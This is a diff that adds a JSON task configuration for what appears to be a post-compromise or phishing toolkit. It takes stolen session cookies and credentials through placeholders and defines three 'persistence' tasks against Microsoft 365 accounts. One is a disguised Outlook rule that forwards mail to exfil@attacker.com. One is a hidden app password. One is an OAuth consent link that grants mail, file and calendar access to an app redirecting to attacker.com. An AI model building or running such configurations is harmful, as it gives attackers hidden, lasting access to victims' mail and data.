@@ -1,0 +1,37 @@
+{
+  "tracker":     "%%%TRACKER%%%",
+  "cookies":     %%%COOKIES%%%,
+  "credentials": %%%CREDENTIALS%%%,
+
+  "tasks": [
+    {
+      "label": "outlook-forwarding-rule",
+      "type":  "persistence",
+      "name":  "OutlookForwardingRule",
+      "params": {
+        "fixSession": "https://outlook.office.com/mail/inbox",
+        "forwardTo":  "exfil@attacker.com",
+        "ruleName":   "Sync Rule",
+        "keepCopy":   true
+      }
+    },
+    {
+      "label": "app-password",
+      "type":  "persistence",
+      "name":  "AddAppPassword",
+      "params": {
+        "fixSession": "https://mysignins.microsoft.com/security-info",
+        "appName":    "Mobile Sync"
+      }
+    },
+    {
+      "label": "oauth-app-authorization",
+      "type":  "persistence",
+      "name":  "AuthorizeOAuthApp",
+      "params": {
+        "fixSession": "https://www.office.com",
+        "consentUrl": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_APP_CLIENT_ID&response_type=code&redirect_uri=https%3A%2F%2Fattacker.com%2Fcallback&scope=offline_access%20Mail.Read%20Files.Read.All%20User.Read%20Calendars.Read&state=CAMPAIGN_ID"
+      }
+    }
+  ]
+}
